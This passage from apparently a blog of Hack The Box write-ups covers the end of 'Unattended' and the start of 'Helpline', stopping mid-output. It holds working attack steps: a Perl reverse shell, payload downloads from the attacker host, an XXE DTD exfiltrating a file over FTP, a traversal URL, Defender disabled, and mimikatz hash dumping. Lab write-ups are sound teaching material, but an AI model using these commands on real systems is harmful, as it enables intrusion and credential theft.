(rw,relatime,block_validity,barrier,user_xattr,acl)tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)tmpfs on /var/tmp type tmpfs (rw,nosuid,nodev,noexec,relatime)First shell using MetasploitIf I upload a PHP meterpreter payload into /tmp I can execute it since the php binary is in the main partition that is executable.&gt; wget http://10.10.14.23:443/snowscan.php -O /tmp/snowscan.php&gt; php /tmp/snowscan.phpI get a meterpreter session a few seconds after.msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 10.10.14.23:80[*] Encoded stage with php/base64[*] Sending encoded stage (51106 bytes) to 10.10.10.126[*] Meterpreter session 1 opened (10.10.14.23:80 -&gt; 10.10.10.126:47394) at 2019-04-15 02:18:34 -0400msf5 exploit(multi/handler) &gt; sessions 1[*] Starting interaction with 1...meterpreter &gt; getuidServer username: www-data (33)The first thing I do once I have a shell is check if I can access user.txt but the /home/guly directory isn’t readble by www-data. Next I grab the MySQL credentials from /var/www/html/index.php:$servername = \"localhost\";$username = \"nestedflanders\";$password = \"1036913cf7d38d4ea4f79b050f171e9fbf3f5e\";$db = \"neddy\";$conn = new mysqli($servername, $username, $password, $db);I don’t have an interactive TTY so I have to issue queries directly from the shell.mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e -e \"show tables\" neddyTables_in_neddyconfigcustomersemployeesfilepathidnameofficesorderdetailsorderspaymentsproductlinesproductsEscalating to a new shell as user gulyI thought about that checkrelease parameter in the config table I saw earlier. It currently contains /home/guly/checkbase.pl;/home/guly/checkplugins.pl; so I guess that this may be a script running at specific interval. I have access to the database so I can change this value.I use the standard perl reverse shell payload, then drop it into /var/lib/php/sessions since it’s the only directory in the main executable partition I have write access to:use Socket;$i=\"10.10.14.23\";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};wget http://10.10.14.23:443/shell.pl -O /var/lib/php/sessions/shell.pl--2019-04-14 22:25:39--  http://10.10.14.23:443/shell.plConnecting to 10.10.14.23:443... connected.HTTP request sent, awaiting response... 200 OKLength: 209 [text/x-perl]Saving to: '/var/lib/php/sessions/shell.pl'Then I update the database configuration to point to the new script:mysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e -e \"update config set option_value = '/usr/bin/perl /var/lib/php/sessions/shell.pl;' where id='86'\" neddymysql -u nestedflanders -p1036913cf7d38d4ea4f79b050f171e9fbf3f5e -e \"select * from config where id='86'\" neddyid\toption_name\toption_value86\tcheckrelease\t/usr/bin/perl /var/lib/php/sessions/shell.pl;After a minute or two I get a connection back:root@ragingunicorn:~/htb/unattended# nc -lvnp 80Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Listening on :::80Ncat: Listening on 0.0.0.0:80Ncat: Connection from 10.10.10.126.Ncat: Connection from 10.10.10.126:47400./bin/sh: 0: can't access tty; job control turned off$ iduid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),47(grub),108(netdev)$ cat user.txt9b413f...IPv6 is configured on this server so I will run an nmap scan against the IPv6 address to see if I can find any other open port.$ ip a2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000    link/ether 00:50:56:b2:7b:c2 brd ff:ff:ff:ff:ff:ff    inet 10.10.10.126/24 brd 10.10.10.255 scope global ens33       valid_lft forever preferred_lft forever    inet6 dead:beef::250:56ff:feb2:7bc2/64 scope global mngtmpaddr dynamic       valid_lft 86215sec preferred_lft 14215sec    inet6 fe80::250:56ff:feb2:7bc2/64 scope link       valid_lft forever preferred_lft foreverAs expected, I find SSH listening:# nmap -6 -p- dead:beef::250:56ff:feb2:7bc2Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-15 02:34 EDTNmap scan report for dead:beef::250:56ff:feb2:7bc2Host is up (0.0081s latency).Not shown: 65534 closed portsPORT   STATE SERVICE22/tcp open  sshNmap done: 1 IP address (1 host up) scanned in 11.48 secondsI’ll add my SSH public keys to guly’s SSH directory so I can log back in later:echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+SZ75RsfVTQxRRbezIJn+bQgNifXvjMWfhT1hJzl/GbTbykFtGPTwuiA5NAcPKPG25jkQln3J8Id2ngapRuW8i8OvM+QBuihsM9wLxu+my0JhS/aNHTvzJF0uN1XkvZj/BkbjUpsF9k6aMDaFoaxaKBa7ST2ZFpxlbu2ndmoB+HuvmeTaCmoY/PsxgDBWwd3GiRNts2HOiu74DEVt0hHbJ7kwhkR+l0+6VS74s+7SjP+N1q+oih83bjwM8ph+9odqAbh6TGDTbPX2I+3lTzCUeGS9goKZe05h/YtB2U2VbH1pxJZ1rfR1Sp+SBS+zblO9MUxvbzQoJTHpH2jeDg89 root@ragingunicorn\" &gt; .ssh/authorized_keysFrom here I will use the SSH shell instead so I have a TTY:root@ragingunicorn:~# ssh guly@dead:beef::250:56ff:feb2:7bc2guly@unattended:~$ iduid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),47(grub),108(netdev)Priv escI check the groups that guly is a member of and the grub group seems suspicious to me. According to https://wiki.debian.org/SystemGroups this isn’t a standard group.I’ll do a search for files owned by the grub group and find a single file: /boot/initrd.img-4.9.0-8-amd64guly@unattended:~$ find / -group grub 2&gt;/dev/null/boot/initrd.img-4.9.0-8-amd64I download the file to my Kali VM:# scp -6 guly@\\[dead:beef::250:56ff:feb2:7bc2\\]:/boot/initrd.img-4.9.0-8-amd64 .initrd.img-4.9.0-8-amd64# file initrd.img-4.9.0-8-amd64initrd.img-4.9.0-8-amd64: gzip compressed data, last modified: Thu Dec 20 22:50:39 2018, from Unix, original size 62110208This is a compressed file, I’ll gunzip it first:# mv initrd.img-4.9.0-8-amd64 initrd.img-4.9.0-8-amd64.gz# gunzip initrd.img-4.9.0-8-amd64.gz# file initrd.img-4.9.0-8-amd64initrd.img-4.9.0-8-amd64: ASCII cpio archive (SVR4 with no CRC)Then unpack the cpio archive in a separate folder:# mv initrd.img-4.9.0-8-amd64 tmproot@ragingunicorn:~/htb/unattended/tmp# cpio -i &lt; initrd.img-4.9.0-8-amd64121309 blocksroot@ragingunicorn:~/htb/unattended/tmp# ls -ltotal 60704drwxr-xr-x 2 root root     4096 Apr 15 02:42 bindrwxr-xr-x 2 root root     4096 Apr 15 02:42 bootdrwxr-xr-x 3 root root     4096 Apr 15 02:42 confdrwxr-xr-x 5 root root     4096 Apr 15 02:42 etc-rwxr-xr-x 1 root root     5960 Apr 15 02:42 init-rw-r----- 1 root root 62110208 Apr 15 02:40 initrd.img-4.9.0-8-amd64drwxr-xr-x 8 root root     4096 Apr 15 02:42 libdrwxr-xr-x 2 root root     4096 Apr 15 02:42 lib64drwxr-xr-x 2 root root     4096 Apr 15 02:42 rundrwxr-xr-x 2 root root     4096 Apr 15 02:42 sbindrwxr-xr-x 8 root root     4096 Apr 15 02:42 scriptsThere’s a lot of files in there and nothing standards out at first. Doing a search for guly (the box creator name) I find an interesting file:root@ragingunicorn:~/htb/unattended/tmp# grep -r -A 5 -B 5 guly *Binary file initrd.img-4.9.0-8-amd64 matches--scripts/local-top/cryptroot-\t\t\tfiscripts/local-top/cryptroot-\t\tfiscripts/local-top/cryptroot-scripts/local-top/cryptroot-scripts/local-top/cryptroot-\t\tif [ ! -e \"$NEWROOT\" ]; thenscripts/local-top/cryptroot:      # guly: we have to deal with lukfs password sync when root changes her onescripts/local-top/cryptroot-      if ! crypttarget=\"$crypttarget\" cryptsource=\"$cryptsource\" \\scripts/local-top/cryptroot-        /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; thenscripts/local-top/cryptroot-\t\t\t\tmessage \"cryptsetup: cryptsetup failed, bad password or options?\"scripts/local-top/cryptroot-\t\t\t\tsleep 3scripts/local-top/cryptroot-\t\t\t\tcontinueThe /sbin/uinitrd c0m3s3f0ss34nt4n1 entry is very peculiar. If I do a google search on c0m3s3f0ss34nt4n1 I don’t find anything so I assume this has been created or modified on purpose. I can’t find any man file for uinitrd and googling doesn’t find anything conclusive. I was expecting to find this is a standard Linux command but it doesn’t seem to be the case.Also, c0m3s3f0ss34nt4n1 = comesefosseantani and the box creator is Italian…I don’t have access to run this on the box itself:guly@unattended:~$ /sbin/uinitrd-bash: /sbin/uinitrd: Permission deniedguly@unattended:~$ ls -l /sbin/uinitrd-rwxr-x--- 1 root root 933240 Dec 20 16:50 /sbin/uinitrdRunning it locally on my VM I get more Italian:# ./uinitrdsupercazzolaLet’s see what happens if I upload my copy to the server and execute it:root@ragingunicorn:~/htb/unattended# scp -6 tmp/sbin/uinitrd guly@\\[dead:beef::250:56ff:feb2:7bc2\\]:unitrduinitrdI get some SHA-1 output when I run the binary. The output changes depending on the string I pass as argument:guly@unattended:~$ ./unitrdc26625fb20563604795b161c6f64b41539e3ec63guly@unattended:~$ ./unitrd 123772fdeb165b85e3f395b903c57014f4c6c0ab133guly@unattended:~$ ./unitrd 123456d98e9572902fce6c98942ffab1bbd3a6d51ff31cguly@unattended:~$ ./unitrd 123456d98e9572902fce6c98942ffab1bbd3a6d51ff31cThose look like SHA1 hashes but I don’t know what they mean. I try the first one as the root password but it doesn’t work.However when I run the program with the c0m3s3f0ss34nt4n1 argument, I am able to su as root with the hash I got:guly@unattended:~$ ./unitrd c0m3s3f0ss34nt4n1132f93ab100671dcb263acaf5dc95d8260e8b7c6guly@unattended:~$ su -Password:root@unattended:~# iduid=0(root) gid=0(root) groups=0(root)root@unattended:~# cat root.txt559c0e..."
  },
  
  {
    "title": "Helpline - Hack The Box",
    "url": "/posts/htb-writeup-helpline/",
    "categories": "hackthebox, infosec",
    "tags": "windows, winrm, mimikatz, efs, ServiceDesk, incognito, tokens, meterpreter, powershell, postgresql, xxe, lfi, evtx, windows logs",
    "date": "2019-08-17 00:00:00 +0800",
    





    
    "snippet": "I did Helpline the unintended way by gaining my initial shell access as NT AUTHORITY\\SYSTEM and then working my way back to the root and user flags. Both flags were encrypted for two different user...",
    "content": "I did Helpline the unintended way by gaining my initial shell access as NT AUTHORITY\\SYSTEM and then working my way back to the root and user flags. Both flags were encrypted for two different users so even with a SYSTEM shell I couldn’t immediately read the files and had to find the user plaintext credentials first. The credentials for user Tolu were especially hard to find: they were hidden in Windows Event Log files and I had to use a Python module to parse those.Summary  ManageEngine ServiceDesk allows guest login and we can recover an excel sheet with “hidden” credentials  There’s an LFI vunerability that let us download the SDP backup files which contains password hashes  We’re able to crack 3 credentials from the database and we can log in to the SDP app with user zachary_33258  Using an OOB XXE vulnerability we obtain the password audit file which contains 3 other credentials  After logging in via WinRM with user alice we reset the SDP application admin account by changing the hash in the postgresql database  Once logged in to SDP as admin, we create a custom trigger action which executes netcat to give us a shell as NT AUTHORITY\\SYSTEM  Both user and root are EFS encrypted and we can’t read them as SYSTEM  Using meterpreter, we impersonate Leo’s token and get access to admin-pass.xml which contains the administrator credential in Powershell secure strings  After obtaining the plaintext password, we use mimikatz to recover the master key and decrypt the root flag  The user flag is encrypted with user Tolu’s credentials. We find those in the Windows log files are using python-evtxPortscan# nmap -sC -sV -p- 10.10.10.132PORT      STATE SERVICE       VERSION135/tcp   open  msrpc         Microsoft Windows RPC445/tcp   open  microsoft-ds?5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)8080/tcp  open  http-proxy    -SMB initial enumerationSMB is not initially accessible with null sessions or the guest account.# smbmap -u test -H 10.10.10.132[+] Finding open SMB ports....[!] Authentication error occured[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)[!] Authentication error on 10.10.10.132ServiceDesk: Initial enumerationThe ManageEngine ServiceDesk Plus 9.3 application is running on port 8080.The application has a guest account enabled by default and we can log in with guest/guest.The guest account has read-only access to the list of solutions.One of the solution contains a password audit spreadsheet that we can download.The main sheet contains some statistics but nothing useful.I noticed that the number of sheets reported differs from the tabs shown.I unhid the sheet then was able to view the “hidden” data.The spreadsheet contains a few passwords but none of them are working on the SDP application, SMB or WinRM.There is an interesting note: File containing details from subsequent audit saved to C:\\Temp\\Password Audit\\it_logins.txt on HELPLINEWe’ll keep that file in mind for later when we find a way to read files outside of the application.ServiceDesk: Getting the database backup using an LFII found a blog post about the CVE-2017-11511 LFI vulnerability.We can view files by using a relative path: http://helpline:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\\..\\..\\..\\..\\..\\..\\fileI tried fetching win.ini and it didn’t work but noticed that the application is running on the E: drive. So that means we won’t be able to read that password audit file located on the C: drive.We don’t even need to be authenticated to use the LFI vulnerability. The next thing is to read sdpbackup.log to find out what is the last backup date:# curl \"http://helpline:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\\..\\..\\..\\..\\..\\..\\manageengine\\servicedesk\\bin\\sdpbackup.log\"[...]Zipfile created: E:\\ManageEngine\\ServiceDesk\\bin\\..\\\\backup\\backup_postgres_9309_fullbackup_03_08_2019_09_04\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.dataZipfile created: E:\\ManageEngine\\ServiceDesk\\bin\\..\\\\backup\\backup_postgres_9309_fullbackup_03_08_2019_09_04\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.dataBackup Completed Successfully.##So we have two backup files we will download:  backup_postgres_9309_fullbackup_03_08_2019_09_04\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data  backup_postgres_9309_fullbackup_03_08_2019_09_04\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.dataUsing the LFI again to download both files:# wget \"http://helpline:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\\..\\..\\..\\..\\..\\..\\manageengine\\servicedesk\\backup\\backup_postgres_9309_fullbackup_03_08_2019_09_04\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data\"[...]2019-03-24 23:34:27 (7.80 MB/s) - ‘download-file?basedir=4&amp;filepath=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\manageengine\\\\servicedesk\\\\backup\\\\backup_postgres_9309_fullbackup_03_08_2019_09_04\\\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data’ saved [2889616]# wget \"http://helpline:8080/fosagent/repl/download-file?basedir=4&amp;filepath=\\..\\..\\..\\..\\..\\..\\manageengine\\servicedesk\\backup\\backup_postgres_9309_fullbackup_03_08_2019_09_04\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data&gt; \"[...]2019-03-24 23:35:01 (1.82 MB/s) - ‘download-file?basedir=4&amp;filepath=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\manageengine\\\\servicedesk\\\\backup\\\\backup_postgres_9309_fullbackup_03_08_2019_09_04\\\\backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data%0A’ saved [14468]Both are zipped files:# file backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.databackup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data: Zip archive data, at least v2.0 to extract# file backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.databackup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data: Zip archive data, at least v2.0 to extractWe’ll extract the files and see that we have a lot of different files, one for each table in the database:/db# unzip backup_postgres_9309_fullbackup_03_08_2019_09_04_part_1.data/db# unzip backup_postgres_9309_fullbackup_03_08_2019_09_04_part_2.data/db# ls -l |moretotal 10912-rw-r--r--  1 root root     326 Mar  8 09:05 aaaaccadminprofile.sql-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccbadloginstatus.sql-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccoldpassword.sql-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccountowner.sql-rw-r--r--  1 root root     349 Mar  8 09:05 aaaaccount.sql-rw-r--r--  1 root root     405 Mar  8 09:05 aaaaccountstatus.sql-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccownerprofile.sql-rw-r--r--  1 root root     147 Mar  8 09:05 aaaaccpassword.sql-rw-r--r--  1 root root       0 Mar  8 09:05 aaaaccuserprofile.sql[...]The aaalogin.sql file contains a few login IDs and usernames, but the passwords are not there.INSERT INTO AaaLogin (login_id,user_id,name,domainname) VALUES(1, 3, N'guest', N'-');(2, 4, N'administrator', N'-');(302, 302, N'luis_21465', N'-');(303, 303, N'zachary_33258', N'-');(601, 601, N'stephen', N'-');(602, 602, N'fiona', N'-');(603, 603, N'mary', N'-');(604, 604, N'anne', N'-');The bcrypt hashes for those accounts are in the aaapassword.sql file:INSERT INTO AaaPassword (password_id,password,algorithm,salt,passwdprofile_id,passwdrule_id,createdtime,factor) VALUES(1, N'$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG', N'bcrypt', N'$2a$12$6VGARvoc/dRcRxOckr6Wmu', 2, 1, 1545350288006, 12);(302, N'$2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki', N'bcrypt', N'$2a$12$2WVZ7E/MbRgTqdkWCOrJP.', 2, 1, 1545428506907, NULL);(303, N'$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm', N'bcrypt', N'$2a$12$Em8etmNxTinGuub6rFdSwu', 2, 1, 1545428808687, NULL);(2, N'$2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa', N'bcrypt', N'$2a$12$hmG6bvLokc9jNMYqoCpw2O', 2, 1, 1545428960671, 12);(601, N'$2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu', N'bcrypt', N'$2a$12$6sw6V2qSWANP.QxLarjHKO', 2, 1, 1545514864248, NULL);(602, N'$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa', N'bcrypt', N'$2a$12$X2lV6Bm7MQomIunT5C651.', 2, 1, 1545515091170, NULL);(603, N'$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu', N'bcrypt', N'$2a$12$gFZpYK8alTDXHPaFlK51Xe', 2, 1, 1545516114589, NULL);(604, N'$2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy', N'bcrypt', N'$2a$12$4.iNcgnAd8Kyy7q/mgkTFu', 2, 1, 1545517215465, NULL);To crack the hashes with hashcat, we only need to keep the first part so we end up with the following file that we feed to hashcat.$2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG$2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm$2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa$2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu$2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuyThe correct hash type is found on https://hashcat.net/wiki/doku.php?id=example_hashes. We can now start our cracking session with the following command:C:\\bin\\hashcat&gt;hashcat64 -a 0 -m 3200 hash.txt passwords\\rockyou.txthashcat (v5.1.0) starting...OpenCL Platform #1: NVIDIA Corporation======================================* Device #1: GeForce GTX 980, 1024/4096 MB allocatable, 16MCUDictionary cache hit:* Filename..: passwords\\rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385$2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu:1234567890$2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm:0987654321$2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa:1q2w3e4rI was able to recover 3 passwords. Cross-referencing the login ID in the aaapassword table with the aaalogin information, we have the following credentials:  zachary_33258 / 0987654321  fiona / 1q2w3e4r  mary / 1234567890ServiceDesk: Zachary userThe user zachary_33258 has access to the scheduler.He can also generate an API key.ServiceDesk: Mary userMary has two tickets in her queue, nothing interesting here.ServiceDesk: Fiona userFiona also has two tickets, the 2nd one has been resolved and we see some credentials there. We make note of those but they ultimately weren’t useful on this box.ServiceDesk: Reading the password audit file via OOB XXE extractionThe following CVE-2017-9362 talks about an XXE vulnerability in the CMDB API. The cool thing is we don’t even need special privileges to use this API endpoint. Zachary has the ability to generate API keys but here I’m just using the fiona user and I’m not specifying any API key.First, let’s check if we can use the API endpoint /api/cmdb/ci/list:Ok, that works. Next let’s try using the example in the blog post above. Unfortunately I got a permissions error when I used the payload from the blog post.I tried a remote DTD and even though I got an error message from the page I did see the HTTP request come in to my Kali box.I then tried the following OOB extraction payload in my xxe_file.dtd:&lt;!ENTITY % d SYSTEM \"file:///c:/Temp/Password Audit/it_logins.txt\"&gt;&lt;!ENTITY % c \"&lt;!ENTITY rrr SYSTEM 'ftp://10.10.14.23:2121/%d;'&gt;\"&gt;The server fetched the DTD from my machine then connected by FTP and sent the content of the password audit file.We now have the following additional credentials:  alice / $sys4ops@megabank!  mike_adm / Password1  dr_acc / dr_accServiceDesk: Resetting the administrator password through PostgresqlThe mike_adm and dr_acc accounts don’t exist but alice does.We can now see shares but we don’t have any access to them:# smbmap -d HELPLINE -u alice -p \\$sys4ops@megabank! -H 10.10.10.132[+] Finding open SMB ports....[+] User SMB session establishd on 10.10.10.132...[+] IP: 10.10.10.132:445\tName: helpline.htb\tDisk                                                  \tPermissions\t----                                                  \t-----------\tADMIN$                                            \tNO ACCESS\tC$                                                \tNO ACCESS\tE$                                                \tNO ACCESS\tHelpdesk_Stats                                    \tNO ACCESS\tIPC$                                              \tREAD ONLYThe WinRM port is listening on this box but I prefer to use Powershell inside Windows to log in instead of the Ruby WinRM module. I have another Windows VM running that I route through my Kali VM so I don’t need to flip between two VPN connections. The traffic from the Windows VM is NATed to the IP of the tun0 interface on the Kali VM.The shell we have is pretty locked down: AMSI is enabled, Constrained Language mode is enabled, and Applocker is configured.We know that the SDP application uses Postgresql as the database backend and that the credentials to log in to the application are stored in the database. Since we have shell access, we can try to change the database entries from the psql.exe application. Fortunately, this application is not blocked by AppLocker.As shown here, we can check the aaapassword table:[10.10.10.132]: PS E:\\ManageEngine\\ServiceDesk\\pgsql\\bin&gt; .\\psql.exe -U postgres -h 127.0.0.1 -p 65432 -d servicedesk -c \"select * from aaapassword\" password_id |                           password                           | algorithm |             salt              |-------------+--------------------------------------------------------------+-----------+-------------------------------+           1 | $2a$12$6VGARvoc/dRcRxOckr6WmucFnKFfxdbEMcJvQdJaS5beNK0ci0laG | bcrypt    | $2a$12$6VGARvoc/dRcRxOckr6Wmu |         302 | $2a$12$2WVZ7E/MbRgTqdkWCOrJP.qWCHcsa37pnlK.0OyHKfd4lyDweMtki | bcrypt    | $2a$12$2WVZ7E/MbRgTqdkWCOrJP. |         303 | $2a$12$Em8etmNxTinGuub6rFdSwubakrWy9BEskUgq4uelRqAfAXIUpZrmm | bcrypt    | $2a$12$Em8etmNxTinGuub6rFdSwu |           2 | $2a$12$hmG6bvLokc9jNMYqoCpw2Op5ji7CWeBssq1xeCmU.ln/yh0OBPuDa | bcrypt    | $2a$12$hmG6bvLokc9jNMYqoCpw2O |         601 | $2a$12$6sw6V2qSWANP.QxLarjHKOn3tntRUthhCrwt7NWleMIcIN24Clyyu | bcrypt    | $2a$12$6sw6V2qSWANP.QxLarjHKO |         602 | $2a$12$X2lV6Bm7MQomIunT5C651.PiqAq6IyATiYssprUbNgX3vJkxNCCDa | bcrypt    | $2a$12$X2lV6Bm7MQomIunT5C651. |         603 | $2a$12$gFZpYK8alTDXHPaFlK51XeBCxnvqSShZ5IO/T5GGliBGfAOxwHtHu | bcrypt    | $2a$12$gFZpYK8alTDXHPaFlK51Xe |         604 | $2a$12$4.iNcgnAd8Kyy7q/mgkTFuI14KDBEpMhY/RyzCE4TEMsvd.B9jHuy | bcrypt    | $2a$12$4.iNcgnAd8Kyy7q/mgkTFu |(8 rows)The documentation contains the bcrypt hash that needs to be replaced in the table to reset the password to admin:  password='$2a$12$fZUC9IK8E/AwtCxMKnCfiu830qUyYB/JRhWpi2k1vgWLC6iLFAgxa'  salt='$2a$12$fZUC9IK8E/AwtCxMKnCfiu'[10.10.10.132]: PS E:\\ManageEngine\\ServiceDesk\\pgsql\\bin&gt; .\\psql.exe -U postgres -h 127.0.0.1 -p 65432 -d servicedesk -c \"update aaapassword set password ='`$2a`$12`$fZUC9IK8E/AwtCxMKnCfiu830qUyYB/JRhWpi2k1vgWLC6iLFAgxa' where password_id=2\"UPDATE 1[10.10.10.132]: PS E:\\ManageEngine\\ServiceDesk\\pgsql\\bin&gt; .\\psql.exe -U postgres -h 127.0.0.1 -p 65432 -d servicedesk -c \"update aaapassword set salt ='`$2a`$12`$fZUC9IK8E/AwtCxMKnCfiu' where password_id=2\"UPDATE 1We can now log in as administrator with the password admin. In the Admin tab, we’ll use the Custom Triggers menu to gain RCE.RCE and a NT AUTHORITY\\SYSTEM reverse shellAs Alice I downloaded netcat to the box even though I can’t execute nc.exe from Alice because of Bitlocker.The I created a new Custom Trigger action in SDP that’ll execute nc.exe when a new Request is created with a subject of pwn.After the request was created, I got a reverse shell as SYSTEM:Disabling protections and grabbing the NTLM hashesWe can’t read user.txt or root.txt even if we’re SYSTEM because they’re both EFS encrypted. We’ll need the plaintext passwords for the account in order to recover the masterkey and decrypt those files.C:\\Users\\Administrator\\Desktop&gt;type root.txtAccess is denied.C:\\Users\\Administrator\\Desktop&gt;cipher /c root.txt Listing C:\\Users\\Administrator\\Desktop\\ New files added to this directory will not be encrypted.E root.txt  Compatibility Level:    Windows XP/Server 2003  Users who can decrypt:    HELPLINE\\Administrator [Administrator(Administrator@HELPLINE)]    Certificate thumbprint: FB15 4575 993A 250F E826 DBAC 79EF 26C2 11CB 77B3  No recovery certificate found.  Key information cannot be retrieved.The specified file could not be decrypted.C:\\Users\\tolu\\Desktop&gt;type user.txtAccess is denied.C:\\Users\\tolu\\Desktop&gt;cipher /c user.txt Listing C:\\Users\\tolu\\Desktop\\ New files added to this directory will not be encrypted.E user.txt  Compatibility Level:    Windows XP/Server 2003  Users who can decrypt:    HELPLINE\\tolu [tolu(tolu@HELPLINE)]    Certificate thumbprint: 91EF 5D08 D1F7 C60A A0E4 CEE7 3E05 0639 A669 2F29  No recovery certificate found.  Key information cannot be retrieved.The specified file could not be decrypted.Next, I disabled the AV running on the system so I could execute Mimikatz and get the NTLM hashes and psexec back in later.PS E:\\ManageEngine\\ServiceDesk\\integration\\custom_scripts&gt; set-mppreference -disablerealtimemonitoring $truePS C:\\programdata&gt; invoke-webrequest -uri http://10.10.14.23/mimikatz.exe -outfile mimikatz.exelsadump::lsa /patchmimikatz # Domain : HELPLINE / S-1-5-21-3107372852-1132949149-763516304RID  : 000001f4 (500)User : AdministratorLM   :NTLM : d5312b245d641b3fae0d07493a022622RID  : 000003e8 (1000)User : aliceLM   :NTLM : 998a9de69e883618e987080249d20253RID  : 000001f7 (503)User : DefaultAccountLM   :NTLM :RID  : 000001f5 (501)User : GuestLM   :NTLM :RID  : 000003f1 (1009)User : leoLM   :NTLM : 60b05a66232e2eb067b973c889b615ddRID  : 000003f2 (1010)User : nielsLM   :NTLM : 35a9de42e66dcdd5d512a796d03aef50RID  : 000003f3 (1011)User : toluLM   :NTLM : 03e2ec7aa7e82e479be07ecd34f1603bRID  : 000001f8 (504)User : WDAGUtilityAccountLM   :NTLM : 52a344a6229f7bfa074d3052023f0b41RID  : 000003ef (1007)User : zacharyLM   :NTLM : eef285f4c800bcd1ae1e84c371eeb282Get access to Leo’s admin password listI found a admin-pass.xml file in Leo’s Desktop directory but I can’t read it because it’s EFS encrypted:C:\\Users\\leo\\Desktop&gt;type admin-pass.xmlAccess is denied.C:\\Users\\leo\\Desktop&gt;cipher /c admin-pass.xmlcipher /c admin-pass.xml Listing C:\\Users\\leo\\Desktop\\ New files added to this directory will not be encrypted.E admin-pass.xml  Compatibility Level:    Windows XP/Server 2003  Users who can decrypt:    HELPLINE\\leo [leo(leo@HELPLINE)]    Certificate thumbprint: 66E4 033A 6EEE 1414 7D7D 9F97 6E5C D1D5 20B0 24B8There’s also a run.ps1 file in the Documents folder so I assume there is some kind of scheduled job running with Leo’s credentials: Directory of C:\\Users\\leo\\Documents12/27/2018  12:06 AM    &lt;DIR&gt;          .12/27/2018  12:06 AM    &lt;DIR&gt;          ..12/27/2018  08:54 PM               462 run.ps1I used meterpreter with the incognito module to see the tokens present in memory.C:\\ProgramData&gt;certutil -f -urlcache http://10.10.14.23/met.exe met.exe****  Online  ****CertUtil: -URLCache command completed successfully.C:\\ProgramData&gt;metPayload options (windows/x64/meterpreter/reverse_tcp):   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)   LHOST     tun0             yes       The listen address (an interface may be specified)   LPORT     7777             yes       The listen portExploit target:   Id 